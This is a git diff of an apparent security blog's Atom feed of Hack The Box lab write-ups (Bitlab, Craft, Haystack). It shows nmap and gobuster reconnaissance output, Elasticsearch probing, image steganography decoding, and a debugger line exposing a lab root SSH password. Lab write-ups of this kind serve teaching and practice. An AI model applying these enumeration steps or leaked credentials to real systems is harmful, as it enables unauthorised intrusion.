37:2b:e4:31:ee:a6:49:0d:9f:e7:e6:01:e6:3e:0a:66 (RSA) | 256 0c:6c:05:ed:ad:f1:75:e8:02:e4:d2:27:3e:3a:19:8f (ECDSA) |_ 256 11:b8:db:f3:cc:29:08:4a:49:ce:bf:91:73:40:a2:80 (ED25519) 80/tcp open http Apache httpd 2.4.7 |_http-server-header: Apache/2.4.7 (Ubuntu) |_http-title: 403 Forbidden Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://0xrick.github.io/hackthebox/player/0.png" /></entry><entry><title type="html">Hack The Box - Bitlab</title><link href="https://0xrick.github.io/hack-the-box/bitlab/" rel="alternate" type="text/html" title="Hack The Box - Bitlab" /><published>2020-01-11T00:00:00+02:00</published><updated>2020-01-11T00:00:00+02:00</updated><id>https://0xrick.github.io/hack-the-box/bitlab</id><content type="html" xml:base="https://0xrick.github.io/hack-the-box/bitlab/">&lt;hr /&gt;
 
 &lt;h2 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h2&gt;
 &lt;p&gt;&lt;br /&gt;Hey guys, today Bitlab retired and here’s my write-up about it. It was a nice CTF-style machine that mainly had a direct file upload and a simple reverse engineering challenge. It’s a Linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.114&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;bitlab.htb&lt;/code&gt;. Let’s jump right in !
@@ -413,7 +1048,15 @@ EBX 00993DA0 ASCII &quot;-ssh root@gitlab.htb -pw &quot;Qf7]8YSV.wDNF*[7d?j&amp;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;&lt;br /&gt;
 &lt;img src=&quot;/images/hackthebox/bitlab/29.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;&lt;br /&gt;And we owned root !&lt;/p&gt;</content><author><name></name></author><category term="linux" /><category term="web" /><category term="ssh" /><category term="rce" /><category term="php" /><category term="reverse-engineering" /><category term="git" /><category term="postgresql" /><summary type="html">Quick Summary Hey guys, today Bitlab retired and here’s my write-up about it. It was a nice CTF-style machine that mainly had a direct file upload and a simple reverse engineering challenge. It’s a Linux box and its ip is 10.10.10.114, I added it to /etc/hosts as bitlab.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services: ``` root@kali:~/Desktop/HTB/boxes/bitlab# nmap -sV -sT -sC -o nmapinitial bitlab.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-10 13:44 EST Nmap scan report for bitlab.htb (10.10.10.114) Host is up (0.14s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA) | 256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA) |_ 256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 (ED25519) 80/tcp open http nginx | http-robots.txt: 55 disallowed entries (15 shown) | / /autocomplete/users /search /api /admin /profile | /dashboard /projects/new /groups/new /groups//edit /users /help |_/s/ /snippets/new /snippets//edit | http-title: Sign in \xC2\xB7 GitLab |_Requested resource was http://bitlab.htb/users/sign_in |_http-trane-info: Problem with XML parsing of /evox/about Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://0xrick.github.io/hackthebox/bitlab/0.png" /></entry><entry><title type="html">Hack The Box - Craft</title><link href="https://0xrick.github.io/hack-the-box/craft/" rel="alternate" type="text/html" title="Hack The Box - Craft" /><published>2020-01-04T00:00:00+02:00</published><updated>2020-01-04T00:00:00+02:00</updated><id>https://0xrick.github.io/hack-the-box/craft</id><content type="html" xml:base="https://0xrick.github.io/hack-the-box/craft/">&lt;hr /&gt;
+&lt;br /&gt;&lt;br /&gt;And we owned root !
+&lt;br /&gt;That’s it , Feedback is appreciated !
+&lt;br /&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;
+&lt;br /&gt;Thanks for reading.
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;br /&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/craft/&quot;&gt;Hack The Box - Craft&lt;/a&gt;
+&lt;br /&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/player/&quot;&gt;Hack The Box - Player&lt;/a&gt;&lt;/p&gt;
+&lt;hr /&gt;</content><author><name></name></author><category term="linux" /><category term="web" /><category term="ssh" /><category term="rce" /><category term="php" /><category term="reverse-engineering" /><category term="git" /><category term="postgresql" /><summary type="html">Quick Summary Hey guys, today Bitlab retired and here’s my write-up about it. It was a nice CTF-style machine that mainly had a direct file upload and a simple reverse engineering challenge. It’s a Linux box and its ip is 10.10.10.114, I added it to /etc/hosts as bitlab.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services: ``` root@kali:~/Desktop/HTB/boxes/bitlab# nmap -sV -sT -sC -o nmapinitial bitlab.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-10 13:44 EST Nmap scan report for bitlab.htb (10.10.10.114) Host is up (0.14s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA) | 256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA) |_ 256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 (ED25519) 80/tcp open http nginx | http-robots.txt: 55 disallowed entries (15 shown) | / /autocomplete/users /search /api /admin /profile | /dashboard /projects/new /groups/new /groups//edit /users /help |_/s/ /snippets/new /snippets//edit | http-title: Sign in \xC2\xB7 GitLab |_Requested resource was http://bitlab.htb/users/sign_in |_http-trane-info: Problem with XML parsing of /evox/about Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://0xrick.github.io/hackthebox/bitlab/0.png" /></entry><entry><title type="html">Hack The Box - Craft</title><link href="https://0xrick.github.io/hack-the-box/craft/" rel="alternate" type="text/html" title="Hack The Box - Craft" /><published>2020-01-04T00:00:00+02:00</published><updated>2020-01-04T00:00:00+02:00</updated><id>https://0xrick.github.io/hack-the-box/craft</id><content type="html" xml:base="https://0xrick.github.io/hack-the-box/craft/">&lt;hr /&gt;
 
 &lt;h2 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h2&gt;
 &lt;p&gt;&lt;br /&gt;Hey guys, today Craft retired and here’s my write-up about it. It’s a medium rated Linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.110&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;craft.htb&lt;/code&gt;. Let’s jump right in !
@@ -835,7 +1478,8 @@ root@craft:~#
 &lt;br /&gt;Thanks for reading.
 &lt;br /&gt;
 &lt;br /&gt;
-&lt;br /&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/smasher2/&quot;&gt;Hack The Box - Smasher2&lt;/a&gt;&lt;/p&gt;
+&lt;br /&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/smasher2/&quot;&gt;Hack The Box - Smasher2&lt;/a&gt;
+&lt;br /&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/bitlab/&quot;&gt;Hack The Box - Bitlab&lt;/a&gt;&lt;/p&gt;
 &lt;hr /&gt;</content><author><name></name></author><category term="linux" /><category term="web" /><category term="ssh" /><category term="rce" /><category term="python" /><category term="code-analysis" /><summary type="html">Quick Summary Hey guys, today Craft retired and here’s my write-up about it. It’s a medium rated Linux box and its ip is 10.10.10.110, I added it to /etc/hosts as craft.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services: ``` root@kali:~/Desktop/HTB/boxes/craft# nmap -sV -sT -sC -o nmapinitial craft.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-03 13:41 EST Nmap scan report for craft.htb (10.10.10.110) Host is up (0.22s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0) | ssh-hostkey: | 2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA) | 256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA) |_ 256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519) 443/tcp open ssl/http nginx 1.15.8 |http-server-header: nginx/1.15.8 |_http-title: About | ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US | Not valid before: 2019-02-06T02:25:47 |_Not valid after: 2020-06-20T02:25:47 |_ssl-date: TLS randomness does not represent time | tls-alpn: | http/1.1 | tls-nextprotoneg: |_ http/1.1 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://0xrick.github.io/hackthebox/craft/0.png" /></entry><entry><title type="html">Hack The Box - Smasher2</title><link href="https://0xrick.github.io/hack-the-box/smasher2/" rel="alternate" type="text/html" title="Hack The Box - Smasher2" /><published>2019-12-14T00:00:00+02:00</published><updated>2019-12-14T00:00:00+02:00</updated><id>https://0xrick.github.io/hack-the-box/smasher2</id><content type="html" xml:base="https://0xrick.github.io/hack-the-box/smasher2/">&lt;hr /&gt;
 
 &lt;h2 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h2&gt;
@@ -6023,368 +6667,4 @@ root@jarvis:~#
 &lt;br /&gt;
 &lt;br /&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/haystack/&quot;&gt;Hack The Box - Haystack&lt;/a&gt;
 &lt;br /&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/networked/&quot;&gt;Hack The Box - Networked&lt;/a&gt;&lt;/p&gt;
-&lt;hr /&gt;</content><author><name></name></author><category term="linux" /><category term="web" /><category term="sqli" /><category term="rce" /><category term="php" /><category term="python" /><category term="suid" /><summary type="html">Quick Summary Hey guys, today Jarvis retired and here’s my write-up about it. It was a nice easy box with a web application vulnerable to SQL injection, a python script vulnerable to command injection and a setuid binary that could be abused to get a root shell. It’s a medium box and its ip is 10.10.10.143, I added it to /etc/hosts as jarvis.htb. Let’s jump right in! Nmap As always we will start with nmap to scan for open ports and services: ``` root@kali:~/Desktop/HTB/boxes/jarvis# nmap -sV -sT -sC -o nmapinitial jarvis.htb Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-08 17:33 EET Nmap scan report for jarvis.htb (10.10.10.143) Host is up (0.24s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA) | 256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA) |_ 256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Stark Hotel Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://0xrick.github.io/hackthebox/jarvis/0.png" /></entry><entry><title type="html">Hack The Box - Haystack</title><link href="https://0xrick.github.io/hack-the-box/haystack/" rel="alternate" type="text/html" title="Hack The Box - Haystack" /><published>2019-11-02T00:00:00+02:00</published><updated>2019-11-02T00:00:00+02:00</updated><id>https://0xrick.github.io/hack-the-box/haystack</id><content type="html" xml:base="https://0xrick.github.io/hack-the-box/haystack/">&lt;hr /&gt;
-
-&lt;h2 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h2&gt;
-&lt;p&gt;&lt;br /&gt;Hey guys, today Haystack retired and here’s my write-up about it. It was an easy fun box and I liked the privilege escalation part. It’s a Linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.115&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;haystack.htb&lt;/code&gt;. Let’s jump right in ! &lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/haystack/0.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;nmap&quot;&gt;Nmap&lt;/h2&gt;
-&lt;p&gt;&lt;br /&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/haystack# nmap -sV -sT -sC -o nmapinitial haystack.htb 
-Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-01 17:33 EET
-Nmap scan report for haystack.htb (10.10.10.115)
-Host is up (0.59s latency).
-Not shown: 997 filtered ports
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
-| ssh-hostkey: 
-|   2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)
-|   256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)
-|_  256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)
-80/tcp   open  http    nginx 1.12.2
-|_http-server-header: nginx/1.12.2
-|_http-title: Site doesn't have a title (text/html).
-9200/tcp open  http    nginx 1.12.2
-| http-methods: 
-|_  Potentially risky methods: DELETE
-|_http-server-header: nginx/1.12.2
-|_http-title: Site doesn't have a title (application/json; charset=UTF-8).
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 218.48 seconds
-root@kali:~/Desktop/HTB/boxes/haystack# 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;We got &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; on 2 ports 80 and 9200, and we got &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; on port 22, Let’s explore the web services.
-&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;web-enumeration&quot;&gt;Web Enumeration&lt;/h2&gt;
-&lt;p&gt;&lt;br /&gt;On port 80 the index page had an image of a needle and nothing else:&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/haystack/1.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;needle.jpg&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;On port 9200 there was an &lt;a href=&quot;https://www.elastic.co/products/elasticsearch&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;elasticsearch&lt;/code&gt;&lt;/a&gt; instance running:&lt;/p&gt;
-&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;root@kali&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~/Desktop/HTB/boxes/haystack#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;curl&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;//haystack.htb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9200&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;iQEYHgS&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;cluster_name&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;elasticsearch&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;cluster_uuid&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;pjrX7V_gSFmJY-DxP4tCQg&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;version&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;number&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;6.4.2&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;build_flavor&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;default&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;build_type&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rpm&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;build_hash&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;04711c2&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;build_date&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;2018-09-26T13:34:09.098244Z&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;build_snapshot&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;lucene_version&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;7.4.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;minimum_wire_compatibility_version&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;5.6.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;minimum_index_compatibility_version&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;5.0.0&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;tagline&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;You Know, for Search&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;Elasticsearch is a distributed, RESTful search and analytics engine capable of addressing a growing number of use cases. As the heart of the Elastic Stack, it centrally stores your data so you can discover the expected and uncover the unexpected. -&lt;a href=&quot;https://www.elastic.co/&quot;&gt;elastic.co&lt;/a&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;&lt;br /&gt;On port 80 I tried running &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; but I got nothing:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/haystack# gobuster -u http://haystack.htb/ -w /usr/share/wordlists/dirb/common.txt
-=====================================================
-Gobuster v2.0.1              OJ Reeves (@TheColonial)
-===================================================== 
-[+] Mode         : dir
-[+] Url/Domain   : http://haystack.htb/  
-[+] Threads      : 10
-[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
-[+] Status codes : 200,204,301,302,307,403  
-[+] Timeout      : 10s
-=====================================================
-2019/11/01 17:44:51 Starting gobuster
-=====================================================
-/index.html (Status: 200)
-=====================================================
-2019/11/01 17:47:06 Finished
-=====================================================
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;I also enumerated &lt;code class=&quot;highlighter-rouge&quot;&gt;vhosts&lt;/code&gt; and got no results.
-&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;steg-in-needlejpg-ssh-creds-from-elasticsearch-user-flag&quot;&gt;Steg in needle.jpg, SSH creds from elasticsearch, User Flag&lt;/h2&gt;
-&lt;p&gt;&lt;br /&gt;I downloaded the image from the index page to check if there’s any kind of steganography:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/haystack# wget http://haystack.htb/needle.jpg
---2019-11-01 17:48:29--  http://haystack.htb/needle.jpg
-Resolving haystack.htb (haystack.htb)... 10.10.10.115
-Connecting to haystack.htb (haystack.htb)|10.10.10.115|:80... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 182982 (179K) [image/jpeg]
-Saving to: ‘needle.jpg’
-
-needle.jpg                                           100%[=====================================================================================================================&amp;gt;] 178.69K  80.2KB/s    in 2.2s    
-2019-11-01 17:48:32 (80.2 KB/s) - ‘needle.jpg’ saved [182982/182982]
-root@kali:~/Desktop/HTB/boxes/haystack# 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;By running &lt;code class=&quot;highlighter-rouge&quot;&gt;strings&lt;/code&gt; on the image I found a base-64 encoded string:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/haystack# strings needle.jpg
-JFIF
-Exif
-paint.net 4.1.1
-UNICODE
----
-bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;After decoding it I got a Spanish sentence:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/haystack# echo bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg== | base64 -d
-la aguja en el pajar es &quot;clave&quot;
-root@kali:~/Desktop/HTB/boxes/haystack# 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;Translation:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;la aguja en el pajar es &quot;clave&quot; =&amp;gt; the needle in the haystack is &quot;key&quot;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
